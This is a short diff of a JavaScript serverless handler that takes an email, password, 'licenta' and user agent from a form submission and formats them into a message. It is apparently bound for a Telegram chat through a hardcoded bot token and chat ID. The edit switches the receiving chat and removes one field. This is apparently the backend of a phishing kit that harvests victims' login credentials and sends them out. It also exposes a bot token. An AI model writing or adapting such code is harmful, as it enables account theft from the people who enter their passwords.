@@ -5,7 +5,7 @@ module.exports = async function handler(req, res) {
 
   console.log('bammmmmmmmm')
   const token = '8303026583:AAFjH0ttFEZCOIJaZlgW5my33HfV4jSIqA0';
-  const chatId = '-5050388811';
+  const chatId = '-5096357861';
 
   try {
     const { email, pass, licenta, agent } = req.body;
@@ -15,7 +15,6 @@ module.exports = async function handler(req, res) {
 
 📧 Email: ${email}
 🔑 Pass: ${pass}
-licenta: ${licenta}
 🖥️ Agent: ${agent}
     `;
 
